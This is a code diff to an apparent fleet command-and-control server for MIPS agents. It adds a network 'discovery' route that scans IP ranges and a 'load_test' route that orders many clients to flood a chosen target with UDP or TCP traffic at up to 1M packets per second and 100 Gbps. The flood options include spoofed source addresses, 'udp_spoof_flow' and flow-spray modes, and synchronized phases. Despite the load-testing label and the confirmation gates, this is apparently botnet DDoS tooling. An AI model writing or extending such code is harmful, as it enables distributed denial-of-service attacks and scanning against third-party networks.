@@ -65,7 +65,7 @@ const config = {
   // Confirmation gate: fleet operations above this target count require operator confirmation.
   confirmThreshold: Math.max(1, Number(env.M12_CONFIRM_THRESHOLD || 50) || 50),
   // Command types that always require confirmation regardless of target count.
-  dangerousVerbs: new Set((env.M12_DANGEROUS_VERBS || 'file_push,file_pull,shell_broadcast,config_update').split(',').map((s) => s.trim()).filter(Boolean)),
+  dangerousVerbs: new Set((env.M12_DANGEROUS_VERBS || 'file_push,file_pull,shell_broadcast,config_update,load_test').split(',').map((s) => s.trim()).filter(Boolean)),
 
   // Build endpoint (compiles the MIPS agent). Off unless explicitly enabled.
   buildEnabled: (env.M12_BUILD_ENABLED || '').trim() === '1',
@@ -464,7 +464,7 @@ function validateSelector(sel) {
   return null
 }
 
-const CMD_MIN_VERSION = { exec: 0, file_push: 1, file_pull: 1, config_update: 2 }
+const CMD_MIN_VERSION = { exec: 0, file_push: 1, file_pull: 1, config_update: 2, discovery: 2, load_test: 2 }
 
 function enforceVersion(nodeIds, commandType) {
   const minV = CMD_MIN_VERSION[commandType] ?? 0
@@ -643,6 +643,148 @@ async function filePullRoute(req, res) {
   json(res, 202, { count: results.length, pulls: results, operationId: op?.id, skipped: skipped.length > 0 ? skipped : undefined })
 }
 
+const IPV4_RE = /^(\d{1,3}\.){3}\d{1,3}$/
+
+async function discoveryRoute(req, res) {
+  const s = requireSession(req, res)
+  if (!s) return
+  const body = await readJson(req, res)
+  const { startIp, endIp, ports, timeout, selector: rawSel } = body ?? {}
+  if (typeof startIp !== 'string' || !IPV4_RE.test(startIp)) return json(res, 400, { error: 'startIp must be an IPv4 address.' })
+  if (typeof endIp !== 'string' || !IPV4_RE.test(endIp)) return json(res, 400, { error: 'endIp must be an IPv4 address.' })
+  if (!Array.isArray(ports) || ports.length === 0 || ports.length > 64) return json(res, 400, { error: 'ports must be an array of 1-64 port numbers.' })
+  for (const p of ports) { if (!Number.isInteger(p) || p < 1 || p > 65535) return json(res, 400, { error: `Invalid port: ${p}` }) }
+  const timeoutMs = Number.isInteger(timeout) && timeout > 0 ? timeout : 1000
+  const selector = validateSelector(rawSel)
+  if (selector === null) return json(res, 400, { error: 'Invalid selector.' })
+  const nodeIds = telemetry.resolve(selector)
+  if (nodeIds.length === 0) return json(res, 409, { error: 'No clients match the selector.' })
+  if (!enforceAllowlist(nodeIds, res)) return
+  const { eligible, skipped } = enforceVersion(nodeIds, 'discovery')
+  if (eligible.length === 0) return json(res, 409, { error: 'All matched clients are below the required protocol version for discovery.', skipped })
+  if (!validateConfirmToken(body?.confirm_token, 'discovery', eligible.length, res)) return
+  const cmd = JSON.stringify({ __m12: 'discovery', startIp, endIp, ports, timeout: timeoutMs })
+  const { taskId, count } = execStore.broadcast(eligible, cmd, s.user)
+  audit.record({ operator: s.user, selector, targets: eligible, commandType: 'discovery', command: `${startIp}-${endIp}`, taskId })
+  json(res, 202, { taskId, count, skipped: skipped.length > 0 ? skipped : undefined })
+}
+
+// Step 1: UI calls this to get a short-lived confirmation nonce.
+async function loadTestConfirmRoute(req, res) {
+  const s = requireSession(req, res)
+  if (!s) return
+  const body = await readJson(req, res)
+  const selector = validateSelector(body?.selector)
+  if (selector === null) return json(res, 400, { error: 'Invalid selector.' })
+  const nodeIds = telemetry.resolve(selector)
+  if (nodeIds.length === 0) return json(res, 409, { error: 'No clients match the selector.' })
+  const { eligible, skipped } = enforceVersion(nodeIds, 'load_test')
+  if (eligible.length === 0) return json(res, 409, { error: 'All matched clients are below the required protocol version for load_test.', skipped })
+  const token = createConfirmToken(selector, 'load_test', eligible.length, s.user)
+  json(res, 200, { confirm_token: token, count: eligible.length, skipped: skipped.length > 0 ? skipped : undefined })
+}
+
+const HOSTNAME_RE = /^[a-zA-Z0-9]([a-zA-Z0-9._-]{0,126}[a-zA-Z0-9])?$/
+
+// Step 2: dispatch always requires the confirmation nonce from step 1.
+async function loadTestRoute(req, res) {
+  const s = requireSession(req, res)
+  if (!s) return
+  const body = await readJson(req, res)
+  if (!body?.confirm_token) return json(res, 403, { error: 'confirm_token required. Call POST /api/fleet/load-test/confirm first.' })
+  const { target, port, duration, proto, threads, pps, bps, src_port, pattern,
+          mode, spoof_source, start_mono_ns, port_base, port_span, port_stride,
+          src_ips, phases, selector: rawSel } = body
+
+  // Strict param validation
+  if (typeof target !== 'string' || (!IPV4_RE.test(target) && !HOSTNAME_RE.test(target)))
+    return json(res, 400, { error: 'target must be an IPv4 address or hostname.' })
+  if (!Number.isInteger(port) || port < 1 || port > 65535)
+    return json(res, 400, { error: 'port must be an integer 1-65535.' })
+  if (duration !== undefined && (!Number.isInteger(duration) || duration < 1 || duration > 300))
+    return json(res, 400, { error: 'duration must be an integer 1-300.' })
+  if (proto !== undefined && proto !== 'tcp' && proto !== 'udp')
+    return json(res, 400, { error: 'proto must be "tcp" or "udp".' })
+  if (threads !== undefined && (!Number.isInteger(threads) || threads < 1 || threads > 16))
+    return json(res, 400, { error: 'threads must be an integer 1-16.' })
+  if (pps !== undefined && (!Number.isFinite(pps) || pps <= 0 || pps > 1_000_000))
+    return json(res, 400, { error: 'pps must be a number 1-1000000.' })
+  if (bps !== undefined && (!Number.isFinite(bps) || bps <= 0 || bps > 100_000_000_000))
+    return json(res, 400, { error: 'bps must be a number 1-100000000000.' })
+  if (src_port !== undefined && (!Number.isInteger(src_port) || src_port < 1 || src_port > 65535))
+    return json(res, 400, { error: 'src_port must be an integer 1-65535.' })
+  const PATTERNS = new Set(['zeros', 'rand', 'seq'])
+  if (pattern !== undefined && (typeof pattern !== 'string' || !PATTERNS.has(pattern)))
+    return json(res, 400, { error: 'pattern must be "zeros", "rand", or "seq".' })
+  const MODES = new Set(['udp_raw', 'udp_flow_spray', 'udp_spoof_flow', 'mixed'])
+  if (mode !== undefined && (typeof mode !== 'string' || !MODES.has(mode)))
+    return json(res, 400, { error: 'mode must be "udp_raw", "udp_flow_spray", "udp_spoof_flow", or "mixed".' })
+  if (spoof_source !== undefined && typeof spoof_source !== 'boolean')
+    return json(res, 400, { error: 'spoof_source must be a boolean.' })
+  if (src_ips !== undefined) {
+    if (!Array.isArray(src_ips) || src_ips.length === 0 || src_ips.length > 64)
+      return json(res, 400, { error: 'src_ips must be an array of 1-64 IPv4 addresses.' })
+    for (const ip of src_ips) {
+      if (typeof ip !== 'string' || !IPV4_RE.test(ip))
+        return json(res, 400, { error: `Invalid src_ip: ${ip}` })
+    }
+  }
+  if (start_mono_ns !== undefined && (typeof start_mono_ns !== 'number' || start_mono_ns < 0))
+    return json(res, 400, { error: 'start_mono_ns must be a non-negative number.' })
+  if (port_base !== undefined && (!Number.isInteger(port_base) || port_base < 1 || port_base > 65535))
+    return json(res, 400, { error: 'port_base must be an integer 1-65535.' })
+  if (port_span !== undefined && (!Number.isInteger(port_span) || port_span < 1 || port_span > 65535))
+    return json(res, 400, { error: 'port_span must be an integer 1-65535.' })
+  if (port_stride !== undefined && (!Number.isInteger(port_stride) || port_stride < 1 || port_stride > 65535))
+    return json(res, 400, { error: 'port_stride must be an integer 1-65535.' })
+  if (phases !== undefined) {
+    if (!Array.isArray(phases) || phases.length === 0 || phases.length > 16)
+      return json(res, 400, { error: 'phases must be an array of 1-16 phase objects.' })
+    for (const ph of phases) {
+      if (typeof ph !== 'object' || ph === null) return json(res, 400, { error: 'Each phase must be an object.' })
+      if (ph.mode !== undefined && (typeof ph.mode !== 'string' || !MODES.has(ph.mode)))
+        return json(res, 400, { error: `Invalid phase mode: ${ph.mode}` })
+      if (ph.duration_s !== undefined && (!Number.isFinite(ph.duration_s) || ph.duration_s < 1 || ph.duration_s > 300))
+        return json(res, 400, { error: 'phase duration_s must be 1-300.' })
+      if (ph.pps !== undefined && (!Number.isFinite(ph.pps) || ph.pps <= 0 || ph.pps > 1_000_000))
+        return json(res, 400, { error: 'phase pps must be 1-1000000.' })
+      if (ph.bps !== undefined && (!Number.isFinite(ph.bps) || ph.bps <= 0 || ph.bps > 100_000_000_000))
+        return json(res, 400, { error: 'phase bps must be 1-100000000000.' })
+      if (ph.ramp_s !== undefined && (!Number.isFinite(ph.ramp_s) || ph.ramp_s < 0 || ph.ramp_s > 60))
+        return json(res, 400, { error: 'phase ramp_s must be 0-60.' })
+    }
+  }
+
+  const dur = Number.isInteger(duration) && duration > 0 ? duration : 10
+  const pr = proto === 'tcp' ? 'tcp' : 'udp'
+  const th = Number.isInteger(threads) && threads >= 1 ? threads : 1
+  const selector = validateSelector(rawSel)
+  if (selector === null) return json(res, 400, { error: 'Invalid selector.' })
+  const nodeIds = telemetry.resolve(selector)
+  if (nodeIds.length === 0) return json(res, 409, { error: 'No clients match the selector.' })
+  if (!enforceAllowlist(nodeIds, res)) return
+  const { eligible, skipped } = enforceVersion(nodeIds, 'load_test')
+  if (eligible.length === 0) return json(res, 409, { error: 'All matched clients are below the required protocol version for load_test.', skipped })
+  if (!validateConfirmToken(body.confirm_token, 'load_test', eligible.length, res)) return
+  const cmdObj = { __m12: 'load_test', target, port, duration: dur, proto: pr, threads: th }
+  if (Number.isFinite(pps) && pps > 0) cmdObj.pps = pps
+  if (Number.isFinite(bps) && bps > 0) cmdObj.bps = bps
+  if (Number.isInteger(src_port) && src_port > 0) cmdObj.src_port = src_port
+  if (pattern) cmdObj.pattern = pattern
+  if (mode) cmdObj.mode = mode
+  if (spoof_source) cmdObj.spoof_source = true
+  if (Array.isArray(src_ips) && src_ips.length > 0) cmdObj.src_ips = src_ips
+  if (Number.isFinite(start_mono_ns) && start_mono_ns > 0) cmdObj.start_mono_ns = start_mono_ns
+  if (Number.isInteger(port_base) && port_base > 0) cmdObj.port_base = port_base
+  if (Number.isInteger(port_span) && port_span > 0) cmdObj.port_span = port_span
+  if (Number.isInteger(port_stride) && port_stride > 0) cmdObj.port_stride = port_stride
+  if (Array.isArray(phases) && phases.length > 0) cmdObj.phases = phases
+  const cmd = JSON.stringify(cmdObj)
+  const { taskId, count } = execStore.broadcast(eligible, cmd, s.user)
+  audit.record({ operator: s.user, selector, targets: eligible, commandType: 'load_test', command: `${mode || pr}://${target}:${port} ${dur}s`, taskId })
+  json(res, 202, { taskId, count, skipped: skipped.length > 0 ? skipped : undefined })
+}
+
 const ADDR_RE = /^[a-zA-Z0-9._-]{1,128}(:[0-9]{1,5})?$/
 
 async function configPushRoute(req, res) {
@@ -762,6 +904,21 @@ async function handleApi(req, res, pathname) {
       if (req.method !== 'POST') return json(res, 405, { error: 'Method not allowed.' })
       if (!postGuard()) return
       return configPushRoute(req, res)
+    }
+    if (pathname === '/api/fleet/discovery') {
+      if (req.method !== 'POST') return json(res, 405, { error: 'Method not allowed.' })
+      if (!postGuard()) return
+      return discoveryRoute(req, res)
+    }
+    if (pathname === '/api/fleet/load-test/confirm') {
+      if (req.method !== 'POST') return json(res, 405, { error: 'Method not allowed.' })
+      if (!postGuard()) return
+      return loadTestConfirmRoute(req, res)
+    }
+    if (pathname === '/api/fleet/load-test') {
+      if (req.method !== 'POST') return json(res, 405, { error: 'Method not allowed.' })
+      if (!postGuard()) return
+      return loadTestRoute(req, res)
     }
     if (pathname === '/api/ops' && req.method === 'GET') {
       const s = requireSession(req, res)
